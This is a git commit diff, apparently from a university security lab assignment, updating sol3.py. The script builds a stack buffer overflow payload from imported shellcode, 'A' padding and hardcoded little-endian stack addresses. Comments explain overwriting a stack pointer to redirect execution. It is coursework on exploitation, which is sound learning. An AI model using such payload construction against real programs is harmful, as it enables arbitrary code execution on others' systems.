22334ed4b865fc04c0220d1d31308dc2b5d7ce33
Libby Cox <libbycox@umich.edu>
2025-04-02 01:08:32 +0000

    Automatic commit by test script for libbycox

--- sol3.py
+++ sol3.py
@@ -4,10 +4,10 @@ import sys
 
 from shellcode import shellcode
 
-sys.stdout.buffer.write(shellcode + ((2048-54+8)*b'A')+(0x7ffffff6d520).to_bytes(8,"little"))
+sys.stdout.buffer.write(shellcode + ((2048-54)*b'A') +(0x7ffffff6d520).to_bytes(8,"little") + (0x7ffffff6d4e8).to_bytes(8,"little"))
 
-#sys.stdout.buffer.write((0x810-54)*b'A'+shellcode+(8*b'A')+(0x0000000000401e02).to_bytes(8,"little"))
-#sys.stdout.buffer.write((b'A'*2002)+shellcode+(0x0000000000401e02).to_bytes(8,"little"))
-
-# need to write into a tmp register and then access 
-# tmp: rbx, rdx, rcx, rdi, rsi
+#sys.stdout.buffer.write(shellcode + ((0x810-54+8)*b'A')+(0x7ffffff6d520).to_bytes(8,"little"))
+# buf(2048) --> a(8) --> p(8) --> return addr but this return addr is not something we can overwrite
+# instead we can write to p, which is a pointer at the bottom of the stack
+# we are trying to put the return addr into p bc cannot overwrite it like before
+# lea starts at 0x810 (this is where the buffer starts)
